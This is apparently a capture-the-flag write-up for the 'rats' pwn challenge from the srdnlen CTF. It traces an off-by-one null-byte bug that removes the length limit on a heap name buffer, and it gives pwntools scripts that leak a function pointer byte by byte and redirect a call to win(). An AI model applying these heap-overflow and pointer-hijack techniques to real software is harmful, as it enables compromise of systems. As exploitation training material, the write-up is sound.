# rats
### done by petiole on strdln ctf

[./rats binary](./rats)

```sh
$ checksec ./rats
[*] '/home/kali/.../srdnlen_ctf23/pwn/rat_pack/rats`
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

#### gets clone
```c
// in void name(rat *rat_ptr)
  puts("Give your rat a name");
  do {
    __isoc99_scanf(&name_scanf_input,&rat_name);
    if (rat_name == (rat)0xa) {
      rat_name = (rat)0x0;
      break;
    }
    rat_ptr[(long)index + 0x10] = rat_name;
    index = index + 1;
  } while (index != rat_name_offset);
  rat_ptr[(long)(index + 1) + 0x10] = (rat)0x0;
```

#### possible shellcode execution?
```c
  // in greetRat(rat **rat_pointers)
  if (rat_pointers[rat_number] == (rat *)0x0) {
    puts("There\'s no rat there.");
  }
  else {
    (**(code **)(rat_pointers[rat_number] + 8))(rat_pointers[rat_number]);
  }
```

#### weird index calcuation
```c
  // in greetRat(rat **rat_pointers)
  puts("Select a rat number.");
  __isoc99_scanf(&select_int_scanf,&rat_number);
  getchar();
  rat_ptr_index_adjuster = (uint)(rat_number >> 0x1f) >> 0x1c;
  rat_number = (rat_number + rat_ptr_index_adjuster & 0xf) - rat_ptr_index_adjuster;
```

- emulated in python3:
```py
def parse_calc(rat_num):
     index = rat_num + (abs(rat_num >> 0x1f) >> 0x1c) & 0xf
     print(f"{bin(rat_num)} -> {index} ({bin(index)})")
```

where `rat_num` is a positive integer, probably

#### achieved segfault
```sh
Rats, we're rats, we're the rats
We prey at night, we stalk at night, we're the rats!

1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

1
Give your rat a name
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

Give your rat a name
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

Give your rat a name
1) Create new rat
2) Greet your rat

<...>

3) Rename the rat
4) Delete the rat
5) Quit.

Give your rat a name
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

Give your rat a name
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

2
Select a rat number.
-1
[1]    30772 segmentation fault (core dumped)  ./rats
```

based off this segmentation fault arising from `greetRat(rat **)`, it seems like
the *most likely* possibility as to why this occurs is due to the code I
indicated as potential shellcode.

```c
  // in greetRat(rat **rat_pointers)
  if (rat_pointers[rat_number] == (rat *)0x0) {
    puts("There\'s no rat there.");
  }
  else {
    (**(code **)(rat_pointers[rat_number] + 8))(rat_pointers[rat_number]);
  }
```

this, admittedly, looks really confusing, but analyzing the associated assembly
actually simplifies things.

```asm
1608:   48 85 c0                test   rax,rax
160b:   74 39                   je     1646 <_Z8greetRatPP3rat+0xb5>
160d:   8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]
1610:   48 98                   cdqe
1612:   48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
1619:   00
161a:   48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
161e:   48 01 d0                add    rax,rdx
1621:   48 8b 00                mov    rax,QWORD PTR [rax]
1624:   48 8b 50 08             mov    rdx,QWORD PTR [rax+0x8]
1628:   8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]
162b:   48 98                   cdqe
162d:   48 8d 0c c5 00 00 00    lea    rcx,[rax*8+0x0]
1634:   00
1635:   48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]
1639:   48 01 c8                add    rax,rcx
163c:   48 8b 00                mov    rax,QWORD PTR [rax]
163f:   48 89 c7                mov    rdi,rax
1642:   ff d2                   call   rdx
1644:   eb 0c                   jmp    1652 <_Z8greetRatPP3rat+0xc1>
```

*be not afraid*

the following are annotations of the disassembly, as it relates to the decompiled
code

```asm
1608:   48 85 c0                test   rax,rax                        # - if(rat_pointers[rat_number] == (rat *) 0x0) {...
160b:   74 39                   je     1646 <_Z8greetRatPP3rat+0xb5>  # |
160d:   8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]        # - (condition returned false, rat_pointers[rat_number] != (rat *) 0x0), so rat exists
1610:   48 98                   cdqe                                  # - setup (**(code **)(rat_pointers[rat_number] + 8))(rat_pointers[rat_number]);
1612:   48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]                # - rdx is now set to the address offset of the n-th rat in the array
1619:   00                                                            #
161a:   48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]       #
161e:   48 01 d0                add    rax,rdx                        #
1621:   48 8b 00                mov    rax,QWORD PTR [rax]            #
1624:   48 8b 50 08             mov    rdx,QWORD PTR [rax+0x8]        # - get address of function pointer in rat class
                                                                      #   (probably, this seems to point to a shared "print rat name function" address.)
                                                                      #   this function is actually dialogue@offset 269
1628:   8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]        # -
162b:   48 98                   cdqe                                  #
162d:   48 8d 0c c5 00 00 00    lea    rcx,[rax*8+0x0]                #
1634:   00                                                            # - call (**(code **)(rat_pointers[rat_number] + 8))(rat_pointers[rat_number]);
1635:   48 8b 45 e8             mov    rax,QWORD PTR [rbp-0x18]       # |
1639:   48 01 c8                add    rax,rcx                        # |
163c:   48 8b 00                mov    rax,QWORD PTR [rax]            # |
163f:   48 89 c7                mov    rdi,rax                        # |> set $rdi, the first argument, to be $rax, the address of the rat being executed
1642:   ff d2                   call   rdx                            # |> call the function at the address of $rdx, usually dialogue(*rat)
1644:   eb 0c                   jmp    1652 <_Z8greetRatPP3rat+0xc1>  # - (condition returned true, rat_pointers[rat_number] != (rat *) 0x0), so rat does not exists
```

upon further investigation, the crash wsa due to `1624: 48 8b 50 08             mov    rdx,QWORD PTR [rax+0x8]`
accessing invalid memory. `rax+0x8` seems to be out ouf bounds

now, it is known that `**(code **)(rat_pointers[rat_number] + 8))(rat_pointers[rat_number]`
*should be* calling `dialogue(rat*)`

based off the assembly below, the address of the function `dialogue(rat*)` is
placed at an offset of 8 bytes. (`rax` is the address of the newly generated
  rat.

```asm
136e:   48 8d 15 f4 fe ff ff    lea    rdx,[rip+0xfffffffffffffef4]        # 1269 <_Z8dialogueP3rat>
1375:   48 89 50 08             mov    QWORD PTR [rax+0x8],rdx
```

however, when just trying to overflow this buffer, namely in function
`name(rat*)`, it is seen that the name is placed starting at `rax+16`, which is
after the pointer to `dialogue(rat*)`

now, the pointer to `dialogue(rat*)` is at `rax+8`, the name starts at `rax+16`,
what goes in between the first 8 bytes starting at `rax`? well, due to the
following line, it's the address of the array containing all rat pointers, which
is on the stack!

```c
// in createRat(rat **rat_pointers)
rat_pointers[index] = (rat *)new_rat; // the address of newly created rat
```

Taking this into `gdb` (with `pwndbg` :) ), the placement of a newly generated
rat can be seen.

so, if the first rat is generated at `0x5555555592a0`, and creating a second
rat, we can see how closely they are placed. (the first one has name "banana",
the second has name "whoops", wich are `0x62616e616e61` and `0x77686f6f7073`
respectively)
```sh
pwndbg> x/40wx 0x5555555592a0
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x616e6162  0x0000616e  0x00000000  0x00000000
0x5555555592c0: 0x00000010  0x00000000  0x00000031  0x00000000
0x5555555592d0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592e0: 0x6f6f6877  0x00007370  0x00000000  0x00000000
0x5555555592f0: 0x00000010  0x00000000  0x00000031  0x00000000
0x555555559300: 0x00000000  0x00000000  0x00000000  0x00000000
0x555555559310: 0x00000000  0x00000000  0x00000000  0x00000000
0x555555559320: 0x00000000  0x00000000  0x00020ce1  0x00000000
0x555555559330: 0x00000000  0x00000000  0x00000000  0x00000000
```

as such, it looks like the address of `dialogue(rat*)`, (`0x555555555269` in
this case) comes after the name of the last rat. as there is no code to readjust
this spacing, then it *looks* like we'll need 8 words of padding (so a total of
32 bytes).

### now, a couple of things:

- it is likely we can overwrite this address with the crappy `gets` clone in
  `name(rat*)`. this can be achieved in two possible ways. by (maybe) deleting
  the first rat and recreating it with a much longer name. otherwise, by
  (probably) renaming the first rat, we can achieve this. either of these should
  work as both call `name(rat*)`
- `name(rat*)` should have the capability of overwriting the pointer address of
  `dialogue(rat*)` as the `gets` clone simply overwrites memory without checking
  until a newline is recieved.

ah, upon further inspection, **this is not true**, kind of...

looking further into `name(rat*)`, there is a condition to the while loop that I
missed, namely: `} while(index != rat_name_offset);`

however, I suppose my confusion with that is: `index` starts as 0, while
`rat_name_offset` is set to be `*(int *)(rat_ptr + 0x20)`.

### so, what even *is* `rat_name_offset`?

looking back at the memory dump,

```sh
pwndbg> x/40wx 0x5555555592a0
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x616e6162  0x0000616e  0x00000000  0x00000000
0x5555555592c0: 0x00000010  0x00000000  0x00000031  0x00000000
0x5555555592d0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592e0: 0x6f6f6877  0x00007370  0x00000000  0x00000000
0x5555555592f0: 0x00000010  0x00000000  0x00000031  0x00000000
0x555555559300: 0x00000000  0x00000000  0x00000000  0x00000000
0x555555559310: 0x00000000  0x00000000  0x00000000  0x00000000
0x555555559320: 0x00000000  0x00000000  0x00020ce1  0x00000000
0x555555559330: 0x00000000  0x00000000  0x00000000  0x00000000
```

if looks like the integer at address `rat_ptr + 0x20` is 0x10? (note: this is at
address `0x5555555592c0`, as the rat was defined at address `0x5555555592a0`. as
such, the maximum number of charaters read would have to be `0x10`... or enough
memory to fill a quad-word.

so it's weird to see that, when the input is greater than 16 characters, the
input seems to be cyclic instead of stopping immediately? after identifying the
offset of the address of `dialogue(rat*)` from `0x5555555592a0`, I attemped to
perform a simple bufferoverflow with the output of the following python3 command

```py
python3 -c "print('aaaa' * 8 + 'yyyyyyyy'+'zzzzzzzz')"
                 # |            |          > overwrite the address of `dialogue(rat*)` with 'z's
                 # |            > overwrite the stack pointer referency with 'y's
                 # > fill padding with 'a's
```

this yeilds the following memory

```sh
pwndbg> x/40wx 0x5555555592a0
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x79797979  0x7a7a7a7a  0x7a7a7a7a  0x79790061
0x5555555592c0: 0x00000010  0x00000000  0x00000031  0x00000000
0x5555555592d0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592e0: 0x00000062  0x00000000  0x00000000  0x00000000
0x5555555592f0: 0x00000010  0x00000000  0x00020d11  0x00000000
0x555555559300: 0x00000000  0x00000000  0x00000000  0x00000000
0x555555559310: 0x00000000  0x00000000  0x00000000  0x00000000
0x555555559320: 0x00000000  0x00000000  0x00000000  0x00000000
0x555555559330: 0x00000000  0x00000000  0x00000000  0x00000000
```
... which is just super strange? even though the while loop should break at
`index = 0x10`, it instead *cyclicly loops* around the first 16 bytes of 
`0x5555555592b0`... for some reason.

along with this, creating a rat with a name longer than 16 characters leads the
`name(rat*)` function to read the first 16 characters, then let the remaining
however many characters to be left in the `stdin` buffer for some reason.

new discovery that is *interesting*.: I created a third (and a fourth and a
fifth rat). I then deleted the fourth rat (index 3) and renamed the second rat
(of index 2) with a thing much longer than 16 characters.

```sh
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

4
Select a rat number.
2
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

3
Select a rat number.
1
Give your rat a name
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.
```

after doing so yeilds the following memory dump (still relative to where the
first rat was created)

```sh
pwndbg> x/40wx 0x5555555592a0
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x64636261  0x68676665  0x6c6b6a69  0x706f6e6d
0x5555555592c0: 0x00000010  0x00000000  0x00000031  0x00000000
0x5555555592d0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592e0: 0x61616161  0x61616161  0x61616161  0x61616161
0x5555555592f0: 0x61616161  0x61616161  0x61616161  0x61616161
0x555555559300: 0x61616161  0x61616161  0x61616161  0x61616161
0x555555559310: 0x61616161  0x61616161  0x61616161  0x61616161
0x555555559320: 0x61616161  0x61616161  0x61616161  0x61616161
0x555555559330: 0x61616161  0x61616161  0x00556161  0x00005555
```

as such, it looks like the `dialogue(rat*)` address was overwritten. this is
confirmed by attemtping to greet rat of index 3.

```sh
1) Create new rat
2) Greet your rat
3) Rename the rat
4) Delete the rat
5) Quit.

2

Select a rat number.
3

Program received signal SIGSEGV, Segmentation fault.

...

Invalid address 0x555500556161

...
```

perfect! we have overwritten the `dialogue(rat*)` pointer and can now call the
address of `win`! ... kind of...

as ASLR seems to be on, then I will have to figure out what address to overwrite
to... `dialogue(rat*)` is at offset `0x269` while `win()` is at offset `0x669`.
so, that means we'll need to leak the address of `dialogue(rat*)` in order to
overwrite the address of `dialogue(rat*)`. but first, let's figure out a way to
consistently overflow this dang buffer.

**WOW** it is 2 am and apparently this is the witching hour when my brain +
binexp clicks. (second time now :p) so, what happens is that, when creating a
rat, the program will automatically define the maximum length of its name to be
`0x10` in `*(undefined4 *)(new_rat + 4) = 0x10;` of `createRat(rat*)`. as such,
the maximum length is stored just after the name in the heap (see below)

```sh
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x31333231  0x00003300  0x00000000  0x00000000
0x5555555592c0: 0x00000010  0x00000000  0x00000031  0x00000000
```
(name is `123`, and after a quad-word including `123`, the limit is placed at
the beginning of the next quad word.)

along with this, `name(rat*)` will read up to 16 characters of stdin to provide
the rat with a name. the expectation is: once the name is entered, the program
appends a nullbyte to terminate the string. ***HOWEVER***, they messed up, and
defined the placement of the nullbyte at `rat_ptr[(long)(index + 1) + 0x10] =
(rat)0x0;` in `name(rat*)`.

the issue is then really subtle, but is a really glaring issue that is only
noticed when a rat is renamed with a shorter name. that is shown below.

```c
do {
  __isoc99_scanf(&name_scanf_input,&rat_name);
  if (rat_name == (rat)0xa) {
    rat_name = (rat)0x0;
    break;
  }
  rat_ptr[(long)index + 0x10] = rat_name;
  index = index + 1;
} while (index != rat_name_offset);
rat_ptr[(long)(index + 1) + 0x10] = (rat)0x0;
```

narrowing it down, this breaks into the following steps

1. get character from user input
2. check if character is a newline, if so, clear the `rat_name` variable and
   stop the loop.
3. append the newly acquired character into the name
4. add 1 to the index
5. loop 1 to 4 while the the name has fewer characters than the offset specifies
6. add one to the index and insert the nullbyte character at that index.

it is step 4 and step 6 that are the kickers. notice how, once a newline is
recieved, the previous step has already incremented index by one. thus, adding
one to the index a second time when setting the nullbyte is unnecessary, but it
will allow us to remove the limit.

that is, recall that the max length of the name is just after the memory where
the name is defined. that is, it is at the index of the max name length, or
index 16. however, when setting the nullbyte, one is added twice to the index!
and this `gets` clone does not check when the end of the actual buffer is. as
such, an input with length 15 (so the last character's index is 14) can be
written, (specifically, the rat can be renamed to that) and then the double
incrementation of the index by one will lead the nullbyte to be placed at index
16 relative to the name, overwriting the length of the name.

what does this do exactly? well, the `gets` clone is stuffed into a do-while
loop. the index starts at 0 and within this do-while loop, the index is
incremented by one. the only way for the loop to end is either for a newline to
be reached, or for the index to equal the value of the maximum name length.
therefore, if the maximum name length is 0, and index will be at least 1 by that
check, then the only way for that loop to halt is for a newline in the input.
this overflows our buffer, and now the real fun begins.

one thing that is nice turns into an annoying one... though it allows the
address to be actually leaked. recall that the program places a nullbyte two
characters after the last letter of the defined name. *well*, this means that,
at any given time, we can only leak one character. thus, to get all 8 bytes of
the address, we would either:

a. repeatedly delete and recreate the same rat, hoping that malloc will always
   create the rat at the same point. this rat would have to be the rat just
   after the one being renamed
b. create 10 rats total, one is the first one with weird cyclic behaviour, the
   next eight are made to determine the stack pointer and the last one would be
   the address to overwrite to `win()`. this also requires luck that all 10 rats
   are placed next to one another in memory.

I'm going to go with a. for now.

```py
stack_ptr = b''
addr_regex = re.compile(b"b*(.)\.\n")

for i in range(8):
    get_stack_ptr = [
        b'3\n1\n', # rename rat at index 1
        b'b' * (name_len_to_leak_stack + i) + b'\n', # remove characters leading up to
                                                     # saved stack addr, leak
                                                     # the i-th character
        b'2\n1\n', # greet the rat at index 1
    ]
    io.send(b''.join(get_stack_ptr))
    # print(io.recvuntil("bbbbbbbb"))
    io.recvuntil("bbbbbbbb")

    stack_ptr_str = io.recvline()
    print(stack_ptr_str)

    stack_ptr = addr_regex.match(stack_ptr_str).group(1) + stack_ptr
    print(f"current stack_ptr={stack_ptr}")

    del_rat = [
        b'4\n2\n', # delete rat at index 2
        b'1\n', # create rat at index 2, hopefully in old spot
        b'overwrite me :)\n',
    ]

    io.send(b''.join(del_rat))
```

diving deeper into the exploit itself, it looks like it *is* possible to use
this method, however, when freeing up the `malloc`-ed space, we run into a
`SIGABRT` stop code :(. however, taking another look at the memory dump, there
is a possible explaination as to why this error occurs.

```sh
pwndbg> x/40wx 0x5555555592a0
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x616e6162  0x0000616e  0x00000000  0x00000000
0x5555555592c0: 0x00000010  0x00000000  0x00000031  0x00000000
0x5555555592d0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592e0: 0x6f6f6877  0x00007370  0x00000000  0x00000000
0x5555555592f0: 0x00000010  0x00000000  0x00000031  0x00000000
```

as a recap, our current understanding of the rat structure.

```c
struct rat {
  rat **rat_ptrs_ref;
  void *fun_ptr;
  char name[16];
  int name_max_len;
} typedef rat;
```

so the question is: where is `0x00000000 0000000031` coming from at address
`0x5555555592c8`? well, in `createRat(rat*)`, a rat is added to the heap by
calling malloc with the argument `0x28`. this is comprised of the following:

```
rat **   -> 0x08 bytes
void *   -> 0x08 bytes
char[16] -> 0x10 bytes
int      -> 0x04 bytes
-----------------------
            0x24 bytes = 36 bytes
```
however, copying the struct we defined for the rat into an online compiler like
the [compiler explorer](https://godbolt.org/) using `gcc 12.2`, the following
code compiles into the assembly following it.

```c
#include <stdio.h>
#include <stdlib.h>

struct rat {
  rat **rat_ptrs_ref;
  void *fun_ptr;
  char name[16];
  int name_max_len;
} typedef rat;

int main(int argc, char ** argv) {
    rat *rat_obj = (rat *) malloc(sizeof(rat));
    printf("%d\n", sizeof(rat)); // outputs 40
    return 0;
}
```

```asm
.LC0:
        .string "%d\n"
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 32
        mov     DWORD PTR [rbp-20], edi
        mov     QWORD PTR [rbp-32], rsi
        mov     edi, 40
        call    malloc
        mov     QWORD PTR [rbp-8], rax
        mov     esi, 40
        mov     edi, OFFSET FLAT:.LC0
        mov     eax, 0
        call    printf
        mov     eax, 0
        leave
        ret
```

as such, it looks like, even though the true size of the struct is `0x24` bytes,
the compiler seems to automatically resolve the size of the rat struct to be
`0x28`, or 40 bytes. I wonder if this has to do with padding stuff and
ensuing that the start of each block is of modulus 8 or if this is specific
to this implementation of `malloc` and `sizeof` but regardless, we know the
source of `0x30`... wait, `0x30`? but in memory we saw `0x31`? well, from what I
remember, discussing `malloc` with others outside of the competition, some
implementations of malloc will indicate which block is in use. as such, this is
done by setting the very last bit of a heap header, or the information
controlling the heap, to 1.

we can kinda consider how `malloc`, at least on my computer is implemented by
tracing the memory as more rats are created.

to start, no rats have been defined, and the heap contains nothing. as such, it
is likely that all bits in the heap are 0 at this time. it could just be
garbage, but regardless, it doesn't matter, it's inaccessible at the start.

creating the first rat yeilds the following memory dump:

```sh
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x64667361  0x00000000  0x00000000  0x00000000
0x5555555592c0: 0x00000010  0x00000000  0x00020d41  0x00000000
0x5555555592d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x5555555592e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x5555555592f0: 0x00000000  0x00000000  0x00000000  0x00000000
```

now that we created one rat, we see that, where `0x31` usually is, `0x00020d41`
is. the usage of this comes apparent when a second rat is created, which yields:

```sh
0x5555555592a0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592b0: 0x00006968  0x00000000  0x00000000  0x00000000
0x5555555592c0: 0x00000010  0x00000000  0x00000031  0x00000000
0x5555555592d0: 0xffffdd80  0x00007fff  0x55555269  0x00005555
0x5555555592e0: 0x31636261  0x00003332  0x00000000  0x00000000
0x5555555592f0: 0x00000010  0x00000000  0x00020d11  0x00000000
```

with some research, particularly [bin 0x14 from LiveOverflow's binary
exploitation series](https://youtu.be/HPDBOhiKaD8), we see that the last bit of
the size of the chunk, that is, `0x31` or `0x20d41`, indicates that the previous
chunk of the heap is currently being used. this helps `free` determine which
chunk to delete, and then aid with future `malloc` calls. (for the most part at
least)

`0x5555555592c8` now has `0x31`, which we've seen previously seen and the
placement of where `0x31` would be for the second rat, we see `0x20d11` (at
address `0x5555555592f8`). this value is `0x30` less than the value of what it
was when there was one rat. thus, it looks like `0x20d11` and `0x31` are
indications of the size of the next heap block (maybe). as such, `free()` is
probably breaking because, if we overwrite this value with just `b`s, then the
computer will try to free up `0x6161616161616161` bytes, which is outside the
range of the heap. thus, it's best to restore `0x31` to the heap before freeing.

this is not too difficult luckily, we know that `0x31` occurs at the 25th to
32nd character of the name. also, as the `rat_pointers` address will be
refreshed, we don't have to worry about the nullbyte.

also, while we're here, we should probably be reading the address of dialogue,
as it's actually in the binary. therefore, the base address of the binary in
memory is easier to determine.

below is the new code that leaks the address of `dialogue(rat*)`

```py
dialogue_ptr_bin = b''
addr_regex = re.compile(b"b*(.)\.\n")

for i in range(8):
    get_dialogue_ptr = [
        b'3\n1\n', # rename rat at index 1
        b'b' * (name_len_to_leak_dialogue + i) + b'\n', # remove characters leading up to
                                                     # saved stack addr, leak
                                                     # the i-th character
        b'2\n1\n', # greet the rat at index 1
    ]
    io.send(b''.join(get_dialogue_ptr))
    # print(io.recvuntil("bbbbbbbb"))
    io.recvuntil("bbbbbbbb")

    dialogue_ptr_str = io.recvline()
    print(dialogue_ptr_str)

    dialogue_ptr_bin = addr_regex.match(dialogue_ptr_str).group(1) + dialogue_ptr_bin
    print(f"current dialogue_ptr=0x{dialogue_ptr_bin.hex()}")

    del_rat = [
        b'3\n1\n', # rename rat at index 1
        b'b' * name_len_to_restore_heap,
        p64(0x31) + b'\n', # restore heap header thing
        b'4\n2\n', # delete rat at index 2
        b'1\n', # create rat at index 2, hopefully in old spot
        b'overwrite me :)\n',
    ]

    io.send(b''.join(del_rat))

# not likely to have `b`, it may but not usually
dialogue_ptr_bin = dialogue_ptr_bin.replace(b'b', b'')
dialogue_ptr = int.from_bytes(dialogue_ptr_bin, "big")

print(f"""
---[ recieved addr ]---
dialogue_ptr (bin) = {dialogue_ptr_bin}
dialogue_ptr (hex) = {hex(dialogue_ptr)}""")
```

looking at the disassembly, we can see that the offset for `dialogue(rat*)` is
at `0x0269` and the offset of the `win()` function, which is what we want to
call, is at offset `0x669`. since we now know the address of `dialogue(rat*)` in
memory during runtime in `dialogue_ptr`, now we can get the address of `win()`
with `dialogue_ptr - 0x269 + 0x669`. now, since `greetRat(rat**)` calls
`dialogue(rat*)` with a function pointer, we can overwrite the address of
`dialogue(rat*)` within the `rat` struct in the heap with the function address
of `win()`, greet the rat and then we have jumped to win! perfect.

*note: if running locally, then a FLAG environment variable needs to be set
before runtime. to do this, the exploit can be locally run via `FLAG=ctf{test}
./exploit.py LOCAL`
